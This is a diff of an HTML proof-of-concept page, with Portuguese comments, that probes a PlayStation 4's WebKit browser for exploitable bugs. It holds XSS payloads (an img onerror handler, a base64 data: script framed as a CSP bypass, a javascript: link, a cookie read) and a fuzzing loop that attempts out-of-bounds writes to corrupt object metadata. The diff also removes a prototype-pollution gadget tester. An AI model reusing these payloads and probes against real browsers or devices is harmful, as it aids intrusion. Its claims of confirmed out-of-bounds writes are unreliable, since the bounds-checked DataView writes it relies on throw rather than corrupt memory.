@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Indirect Probes v6</title>
+    <title>PS4 WebKit PoC - Speculative Probes v7</title>
     <style>
         /* Estilos CSS (mantidos) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
@@ -12,7 +12,7 @@
         .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
         .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
         .log-vuln { color: #ff4444; font-weight: bold; }
-        .log-leak { color: #FF9800; font-weight: bold; } /* Usado para erros pós-corrupção */
+        .log-leak { color: #FF9800; font-weight: bold; } /* Usado para erros/efeitos pós-corrupção */
         .log-ptr { color: #f0f; font-weight: bold; }
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
@@ -22,209 +22,174 @@
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Indirect Probes v6</h1>
-    <p>Foco: Efeitos Indiretos OOB Write, Testador Gadgets PP.</p>
+    <h1>PS4 WebKit PoC - Speculative Probes v7</h1>
+    <p>Foco: Tentar causar Type Confusion / Efeitos Indiretos via OOB Write em Metadados (Especulativo).</p>
     <div id="user-agent-info">Recuperando User Agent...</div>
     <div id="controls">
         </div>
     <div id="poc-output"></div>
-    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;">Área para teste de XSS DOM e PP Gadgets.</div>
+    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;">Área para teste de XSS DOM.</div>
 
     <script>
         let outputDiv = document.getElementById('poc-output');
         const log = (message, type = 'info') => { /* Função log igual anterior */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
-        const PAUSE_DURATION = 300;
-        const SHORT_PAUSE = 50;
-
-        // --- Funções Auxiliares ---
-        const isPotentialPointer = (high, low) => { /* Função isPotentialPointer simplificada */ return high > 0 || low >= 0x10000; };
+        const PAUSE_DURATION = 200; // Reduzir pausa geral
+        const SHORT_PAUSE = 30;  // Reduzir pausa curta
 
         // --- Coleta de User Agent (igual v4) ---
-        const displayUserAgent = () => { /* ... código igual ao v5 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};
+        const displayUserAgent = () => { /* ... código igual ao v6 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};
 
         // --- Teste 1: XSS (Mantido - Sucesso Confirmado) ---
         const demonstrateXSS_Alert=()=>{log("XSS Alert...","warn");try{alert('XSS Alert!');}catch(e){log(`Alerta bloq: ${e.message}`,'good');}};const demonstrateXSS_DOM=()=>{log("XSS DOM...","warn");try{const t=document.getElementById('xss-target-div');if(t){t.innerHTML='<h2 class="log-vuln">XSS DOM!</h2><img src=x onerror=alert("XSS DOM ONERROR")>';log("DOM Manip OK.",'vuln');}else{log("Alvo DOM ñ enc.","error");}}catch(e){log(`Erro XSS DOM: ${e.message}`,'error');}};const demonstrateXSS_Cookie=()=>{log("XSS Cookie...","warn");try{const c=document.cookie;log(`Cookie: '${c}'`,c?'vuln':'info');}catch(e){log(`Erro Cookie: ${e.message}`,'warn');}};
         const runCSP_XSS = () => { log("--- T1: CSP Bypass + XSS ---",'test'); try{const pL=`log("[PD] Exec...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log('onerror!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add.",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- T1 Concluído ---",'test'); };
 
 
-        // --- Teste 2: OOB Write Indirect Effects v6 (igual anterior) ---
-        const runOOBIndirectEffects_v6 = async () => { /* ... código completo igual ao fornecido anteriormente ... */
-            log("--- T2: OOB Write Indirect Effects v6 ---",'test');log("Foco: Corromper sutilmente via OOB e observar efeitos ao USAR a vítima.",'warn');log("ALTO RISCO DE CRASH!",'crash');const bS=64;const oWO=[-16,-8,-4,-1,8,16];const cV=[0,1,0xFF,0xAAAAAAAA];const vF={"ArrayBuffer":()=>new ArrayBuffer(128),"Uint32Array":()=>new Uint32Array(32),"Object":()=>({id:123,name:"victimObj",data:[1,2,3],valid:true}),"HTMLElement":()=>{const d=document.createElement('span');d.id='victimSpan';d.textContent='victim';return d;}};for(const vN in vF){for(const wO of oWO){for(const wV of cV){log(`Testando: Escrita OOB @${wO} val ${wV.toString(16)}, Vítima: ${vN}`,'subtest');let vO=null;let aB=null;let aDV=null;let eD=false;try{vO=vF[vN]();aB=new ArrayBuffer(bS);aDV=new DataView(aB);log(` Atacante (Buffer ${bS}B) e Vítima (${vN}) alocados.`,'info');const aWA=aB.byteLength+wO;try{aDV.setUint32(aWA,wV,true);log(` Escrita OOB @offset ${wO} com ${wV.toString(16)} realizada.`,'good');}catch(e){log(` Escrita OOB @offset ${wO} falhou: ${e.message}`,'warn');continue;}await new Promise(r=>setTimeout(r,SHORT_PAUSE/2));log(` Tentando usar objeto Vítima (${vN}) após OOB write...`,'warn');try{log(` Verificando tipo/estado inicial...`,'info');let iC=`Type: ${typeof vO}`;if(vO instanceof ArrayBuffer)iC+=`, byteLength: ${vO.byteLength}`;else if(ArrayBuffer.isView(vO))iC+=`, length: ${vO.length}, byteLength: ${vO.byteLength}`;else if(vO instanceof HTMLElement)iC+=`, tagName: ${vO.tagName}, id: ${vO.id}`;else if(typeof vO==='object')iC+=`, keys: ${Object.keys(vO)}`;log(` ${iC}`,'info');log(` Realizando ações de uso...`,'info');if(vO instanceof ArrayBuffer||ArrayBuffer.isView(vO)){let v=ArrayBuffer.isView(vO)?vO:new Uint8Array(vO);if(v.length>0)v[0]=v[0];if(v.length>10)v[v.length-1]=v[v.length-1];vO.slice(0,Math.min(1,v.byteLength));if(ArrayBuffer.isView(vO))vO.fill(0xEE,0,Math.min(1,v.length));}if(typeof vO==='object'&&vO!==null){JSON.stringify(vO);Object.keys(vO);vO.toString();if(vO.hasOwnProperty('id'))vO.id=vO.id;vO.newProp=123;delete vO.newProp;}if(vO instanceof HTMLElement){vO.textContent=vO.textContent;document.getElementById('xss-target-div').appendChild(vO);document.getElementById('xss-target-div').removeChild(vO);}console.log("Logando vítima:",vO);log(` Uso da vítima concluído SEM ERROS IMEDIATOS.`,'good');log(` Verificando estado final...`,'info');let fC=`Type: ${typeof vO}`;if(vO instanceof ArrayBuffer)fC+=`, byteLength: ${vO.byteLength}`;else if(ArrayBuffer.isView(vO))fC+=`, length: ${vO.length}, byteLength: ${vO.byteLength}`;else if(vO instanceof HTMLElement)fC+=`, tagName: ${vO.tagName}, id: ${vO.id}`;else if(typeof vO==='object')fC+=`, keys: ${Object.keys(vO)}`;log(` ${fC}`,'info');if(iC!==fC){log(` >> ESTADO VÍTIMA MUDOU APÓS USO! <<`,'leak');eD=true;}}catch(e){log(` ERRO AO USAR VÍTIMA (EFEITO INDIRETO?): ${e.message} ${e.stack?e.stack.substring(0,100)+'...':''}`,'leak');eD=true;}}catch(e){log(` Erro GERAL durante teste: ${e.message}`,'error');}finally{vO=null;aB=null;aDV=null;}if(eD){log(` >>> POTENCIAL EFEITO INDIRETO DETECTADO (Escrita @${wO} val ${wV.toString(16)}, Vítima: ${vN}) <<<`,'vuln');}await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}await new Promise(r=>setTimeout(r,PAUSE_DURATION));}log("--- T2 Concluído ---",'test');
-        };
+        // --- NOVO Teste 2: Speculative Metadata Corruption v7 ---
+        const runMetadataCorruption_v7 = async () => {
+            log("--- T2: Speculative Metadata Corruption v7 ---", 'test');
+            log("Foco: Escrever OOB em vários offsets e valores, esperando causar Type Confusion ou outros efeitos.", 'warn');
+            log("EXTREMO RISCO DE CRASH!", 'crash');
 
+            const bufferSize = 64;
+            // Offsets OOB relativos ao FIM do buffer atacante a testar (passo de 4 bytes)
+            const oobWriteOffsets = [];
+            for(let i = -32; i <= 32; i += 4) { oobWriteOffsets.push(i); }
 
-        // --- Teste 3: Prototype Pollution Gadget Tester v6 (LISTA ATUALIZADA) ---
-        const runPPGadgetTester_v6 = async () => {
-            log("--- T3: Prototype Pollution Gadget Tester v6 ---", 'test');
-            log("Foco: Testar herança e efeito de PP para propriedades definidas pelo usuário.", 'warn');
-            log("EDITAR O SCRIPT para adicionar/remover nomes em 'propertiesToTest'", 'warn');
-
-            // =======================================================================
-            // <<< EDITE A LISTA ABAIXO com nomes de propriedades para testar >>>
-            //      Baseado na sua pesquisa. Adicione/remova conforme necessário.
-            const propertiesToTest = [
-                // Exemplos Gerais/Comuns PP
-                "constructor",
-                "__proto__",
-                "prototype", // Poluir 'prototype' em Object.prototype? Pode quebrar tudo.
-                "toJSON",
-                "then",
-                // Exemplos DOM/Navegador da sua pesquisa
-                "innerHTML",
-                "srcdoc",
-                "cookie",
-                "localStorage", // Afeta o objeto localStorage global?
-                "sessionStorage",// Afeta o objeto sessionStorage global?
-                "domain",
-                "href",          // Afeta location.href?
-                "onload",        // Menos provável afetar window.onload diretamente
-                "onerror",
-                "onclick",
-                // Exemplos Outros
-                "className",
-                "nodeType",
-                // "PS4Shell_exampleMethod", // Exemplo hipotético (requer pesquisa/confirmação)
+            // Valores a escrever (32 bits) - incluindo padrões que podem ser tags ou ponteiros inválidos
+            const corruptionValues = [
+                 0x00000000, 0x00000001, 0xFFFFFFFF, // Básicos
+                 0x41414141, // 'AAAA'
+                 0x80000000, // Limites de inteiro
+                 0x00000002, 0x00000003, 0x00000004, // Small integers (tags?)
+                 // Adicionar outros valores se tiver hipóteses
             ];
-            // =======================================================================
-
-            const pollutedValueBase = "PP_V6_TEST_";
-            const targetFactories = { // Objetos onde verificar herança
-                "Object": () => ({}),
-                "Array": () => [],
-                "DIV": () => document.createElement('div'),
-                "IFRAME": () => document.createElement('iframe'),
-                "Function": () => function() {}
-                // Adicionar outros alvos relevantes se necessário
+            // Tipos de vítima
+            const victimFactories = {
+                "ArrayBuffer": () => new ArrayBuffer(128),
+                "Uint32Array": () => new Uint32Array(32), // Mesma memória que AB(128)
+                "Object": () => ({ type: 'victim', id: Math.random(), data: [1,2,3] })
             };
 
-            for (const propName of propertiesToTest) {
-                log(`Testando PP Gadget: '${propName}'`, 'subtest');
-                // Validar nome da propriedade (evitar poluir com nomes inválidos)
-                if (!propName || typeof propName !== 'string' || propName.trim() === '') {
-                    log(`  Nome de propriedade inválido/vazio pulado.`, 'warn');
-                    continue;
-                }
-                const pollutedValue = pollutedValueBase + propName;
-                let inherited = false;
-                let actionError = null;
+            // Loop principal - Iterar por tudo pode demorar MUITO e crashar cedo
+            // Considerar reduzir o número de offsets/valores/vítimas se demorar demais
+            outerLoop:
+            for (const victimName in victimFactories) {
+                for (const writeOffset of oobWriteOffsets) {
+                    for (const writeValue of corruptionValues) {
+                        // Verificar se outputDiv ainda existe (parar se crash anterior limpou)
+                         if (!outputDiv) { log("Output Div sumiu, parando testes.", "error"); break outerLoop; }
 
-                try {
-                    // 1. Poluir (com verificação)
-                    log(`  Poluindo Object.prototype['${propName}'] = "${pollutedValue}"`, 'info');
-                    try {
-                         Object.prototype[propName] = pollutedValue;
-                         // Verificar se realmente poluiu (pode falhar para __proto__ etc.)
-                         if (Object.prototype[propName] !== pollutedValue && propName !== '__proto__') {
-                             log(`  AVISO: Falha ao definir valor no protótipo para '${propName}'?`, 'warn');
-                             // Continuar mesmo assim, talvez a verificação falhe mas a poluição funcione
-                         }
-                    } catch(e) {
-                         log(`  ERRO ao tentar poluir '${propName}': ${e.message}`, 'error');
-                         continue; // Pular para próxima propriedade se poluição falhar
-                    }
+                        log(`Testando: OOB W @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}`, 'subtest');
+                        let victimObj = null;
+                        let attackerBuffer = null;
+                        let attackDataView = null;
+                        let effectDetected = false;
+                        let initialCheck = "N/A";
 
-
-                    // 2. Verificar Herança
-                    log(`  Verificando herança em: ${Object.keys(targetFactories).join(', ')}`, 'info');
-                    for (const targetName in targetFactories) {
                         try {
-                             const targetObj = targetFactories[targetName]();
-                             // Usar 'in' ou hasOwnProperty pode ser enganado por PP, verificar valor diretamente
-                             if (targetObj && targetObj[propName] === pollutedValue) {
-                                 log(`    VULN: Objeto '${targetName}' herdou '${propName}'!`, 'vuln');
-                                 inherited = true;
-                             }
-                        } catch(e) { log(`    WARN: Erro ao verificar herança em ${targetName}: ${e.message}`, 'warn'); }
-                    }
-                    if (!inherited) {
-                         log(`  INFO: Nenhum objeto testado pareceu herdar '${propName}'.`, 'info');
-                    }
+                            // Alocar logo antes do teste para reduzir interferência
+                            victimObj = victimFactories[victimName]();
+                            attackerBuffer = new ArrayBuffer(bufferSize);
+                            attackDataView = new DataView(attackerBuffer);
+                            //log(`  Atacante e Vítima (${victimName}) alocados.`, 'info');
 
-                    // 3. Tentar Ação Genérica (Pode ou não ativar algo, pode crashar)
-                    // Aumentar chance de efeito adicionando mais ações
-                    if (inherited) { // Ou talvez tentar mesmo sem herança confirmada? Mudar para 'true' para sempre tentar.
-                        log(`  Tentando ações genéricas pós-poluição de '${propName}'...`, 'warn');
-                        try {
-                            // Ação 1: DOM (se aplicável)
-                            if (["innerHTML", "srcdoc", "className", "id", "onclick", "onerror", "onload"].includes(propName)) {
-                                const elem = document.createElement(propName === 'srcdoc' ? 'iframe' : 'div');
-                                log(`    Adicionando <${elem.tagName}> poluído ao DOM...`, 'warn');
-                                const targetDiv = document.getElementById('xss-target-div');
-                                targetDiv.appendChild(elem);
-                                await new Promise(r=>setTimeout(r, SHORT_PAUSE)); // Pausa p/ renderizar
-                                targetDiv.removeChild(elem); // Limpar
-                                log(`    Elemento <${elem.tagName}> adicionado/removido.`, 'info');
+                            // Realizar escrita OOB (4 bytes)
+                            const absoluteWriteAddr = attackerBuffer.byteLength + writeOffset;
+                            try {
+                                attackDataView.setUint32(absoluteWriteAddr, writeValue, true); // Escrever 32 bits
+                                // log(`  Escrita OOB @${writeOffset} OK.`, 'good');
+                            } catch (e) {
+                                // Logar falha APENAS se não for 'out of bounds', pois isso é esperado
+                                if (!e.message.includes("bounds")) {
+                                     log(`  Escrita OOB @${writeOffset} falhou INESPERADAMENTE: ${e.message}`, 'error');
+                                }
+                                continue; // Pular para próximo se escrita falhar (mesmo que esperado)
                             }
-                            // Ação 2: JSON
-                            if (["toJSON", "toString"].includes(propName)) {
-                                log(`    Chamando JSON.stringify({})`, 'warn');
-                                JSON.stringify({});
-                            }
-                             // Ação 3: Promise
-                             if (["then", "catch", "finally"].includes(propName)) {
-                                 log(`    Tentando criar/resolver Promise`, 'warn');
-                                 await Promise.resolve().catch(()=>{}); // Tentar usar promise
-                             }
-                             // Ação 4: Storage (tentar acessar após poluir)
-                             if (propName === "localStorage" || propName === "sessionStorage" || propName === "cookie") {
-                                 try { log(`    Acessando ${propName}...`, 'warn'); const val = window[propName]; } catch(e){}
-                             }
-                             // Ação 5: Navegação/Location (tentar acessar após poluir)
-                              if (propName === "href" || propName === "domain") {
-                                 try { log(`    Acessando location.${propName}...`, 'warn'); const val = location[propName]; } catch(e){}
-                             }
-                             // Ação 6: Construtor (PERIGOSO!) - REMOVIDO POR SEGURANÇA PADRÃO
-                             // if (propName === "constructor") { ... }
+                            // NÃO pausar aqui para tentar usar a vítima o mais rápido possível
 
-                             log(`    Ações genéricas concluídas sem erros imediatos.`, 'good');
+                            // Tentar USAR o objeto vítima extensivamente
+                            // log(`  Usando Vítima (${victimName}) pós-OOB...`, 'info');
+                            try {
+                                // Check inicial rápido
+                                initialCheck = `Type: ${typeof victimObj}`;
+                                if (victimObj?.byteLength !== undefined) initialCheck += `, BL: ${victimObj.byteLength}`;
+                                else if (victimObj?.length !== undefined) initialCheck += `, L: ${victimObj.length}`;
+                                //log(`    ${initialCheck}`, 'info');
+
+                                // === Bloco de Uso Intensivo ===
+                                // Ações que podem acessar metadados internos ou causar type confusion
+                                let usageResult = '';
+                                if (victimObj instanceof ArrayBuffer) {
+                                    usageResult += `slice:${victimObj.slice(0,0)?.byteLength},`;
+                                    const u8 = new Uint8Array(victimObj); // Criar view
+                                    usageResult += `view[0]:${u8[0]},`;
+                                } else if (ArrayBuffer.isView(victimObj)) {
+                                    usageResult += `[0]:${victimObj[0]},len:${victimObj.length},BL:${victimObj.byteLength},`;
+                                    victimObj.fill(1,0,1); victimObj.slice(0,0);
+                                } else if (victimObj instanceof HTMLElement) {
+                                     usageResult += `tag:${victimObj.tagName},txt:${victimObj.textContent?.length},`;
+                                     document.body.appendChild(victimObj); document.body.removeChild(victimObj);
+                                } else if (typeof victimObj === 'object' && victimObj !== null) {
+                                    usageResult += `keys:${Object.keys(victimObj)?.length},str:${victimObj.toString()?.length},`;
+                                    JSON.stringify(victimObj); // Pode falhar se corrompido
+                                    for(const k in victimObj) { if(victimObj.hasOwnProperty(k)) usageResult+=`${k}:${typeof victimObj[k]},`; }
+                                }
+                                console.log(`Victim usage check`); // Linha mínima para console
+                                // ==============================
+
+                                // Check final rápido
+                                let finalCheck = `Type: ${typeof victimObj}`;
+                                if (victimObj?.byteLength !== undefined) finalCheck += `, BL: ${victimObj.byteLength}`;
+                                else if (victimObj?.length !== undefined) finalCheck += `, L: ${victimObj.length}`;
+
+                                // Comparar estado
+                                if (initialCheck !== finalCheck) {
+                                    log(`    >> ESTADO MUDOU! Antes: ${initialCheck} / Depois: ${finalCheck}`, 'leak');
+                                    effectDetected = true;
+                                } else {
+                                    //log(`    Uso OK. Estado final: ${finalCheck}`, 'info');
+                                }
+
+                            } catch (e) {
+                                log(`    ERRO AO USAR VÍTIMA (EFEITO?): ${e.message}`, 'leak');
+                                effectDetected = true;
+                            }
                         } catch (e) {
-                            log(`    ERRO durante ação genérica (EFEITO PP?): ${e.message}`, 'leak');
-                            actionError = e;
+                            log(`  Erro GERAL: ${e.message}`, 'error');
+                        } finally { victimObj = null; attackerBuffer = null; attackDataView = null; } // GC help
+
+                        if (effectDetected) {
+                           log(`  >>> EFEITO DETECTADO (OOB W @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}) <<<`, 'vuln');
+                           // Considerar PARAR aqui se um efeito for encontrado para analisar?
+                           // break outerLoop;
                         }
-                    }
+                        // Pequena pausa APÓS o teste completo de um caso
+                         await new Promise(r => setTimeout(r, SHORT_PAUSE));
 
-                } catch (e) {
-                    log(`  Erro GERAL durante teste do gadget '${propName}': ${e.message}`, 'error');
-                } finally {
-                    // 4. Limpar
-                    try {
-                        delete Object.prototype[propName];
-                        // Verificar se limpou
-                        if (propName !== "__proto__" && Object.prototype[propName] === pollutedValue){
-                             log(`  AVISO: Falha ao limpar prop '${propName}' do protótipo?`, 'warn');
-                        } else {
-                            log(`  Propriedade '${propName}' limpa.`, 'info');
-                        }
-                    } catch (e) { log(`  WARN: Falha ao limpar prop '${propName}': ${e.message}`, 'warn');}
-                }
-
-                 if (inherited || actionError) {
-                     log(`  >> Teste para '${propName}' concluído com ${inherited ? 'HERANÇA CONFIRMADA' : ''}${actionError ? ' e ERRO NA AÇÃO' : ''}. Analisar logs. <<`, inherited ? 'vuln' : 'leak');
-                 }
-                 await new Promise(r=>setTimeout(r, SHORT_PAUSE));
-            } // Fim loop propriedades
-
-            log("--- T3 Concluído ---", 'test');
+                    } // Fim loop valores
+                } // Fim loop escrita OOB
+            } // Fim loop tipos de vítima
+            log("--- T2 Concluído ---", 'test');
         };
 
-        // --- Teste 4: OOB Write Confirm (Mantido - Sucesso Confirmado) ---
-        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v5 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };
 
-        // --- Testes 5 e 6 Removidos ---
+        // --- Teste 3: PP (REMOVIDO) ---
+
+        // --- Teste 4: OOB Write Confirm (Mantido - Base) ---
+        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v5 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };
 
         // --- Função Principal ---
         const runAll = async () => {
              displayUserAgent();
              if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
-            log("Iniciando todos os testes (INDIRECT PROBES v6)...");
+            log("Iniciando todos os testes (SPECULATIVE PROBES v7)...");
             const tests = [ // Sequência atualizada
                 runCSP_XSS,                     // T1: XSS Base (OK)
-                runOOBIndirectEffects_v6,       // T2: OOB Indirect Effects (NOVO)
-                runPPGadgetTester_v6,           // T3: PP Gadget Tester (NOVO - Editável)
-                runOOBTestU8_Confirm,           // T4: OOB Confirm (OK)
+                runMetadataCorruption_v7,       // T2: Speculative Metadata Corruption (NOVO)
+                runOOBTestU8_Confirm,           // T3: OOB Confirm (OK - Renumerado)
             ];
              for(let i=0; i < tests.length; i++){ /* ... loop igual ao v5 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
-            if(outputDiv) log("\n\nTodos os testes INDIRECT PROBES v6 concluídos.", 'test');
+            if(outputDiv) log("\n\nTodos os testes SPECULATIVE PROBES v7 concluídos.", 'test');
             else console.error("Script concluído, div log NULO.");
              if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
         };
@@ -232,9 +197,8 @@
         // Adicionar controles manuais atualizados
         document.getElementById('controls').innerHTML = `
             <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
-            <button onclick="runOOBIndirectEffects_v6()">Rodar T2 (OOB Indirect v6)</button>
-            <button onclick="runPPGadgetTester_v6()">Rodar T3 (PP Gadget Test v6)</button>
-            <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
+            <button onclick="runMetadataCorruption_v7()">Rodar T2 (Meta Corruption v7)</button>
+            <button onclick="runOOBTestU8_Confirm()">Rodar T3 (OOB Confirm)</button>
             <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
             <br>
             <span style="margin-left: 5px;">Teste JS Link (T1): </span>
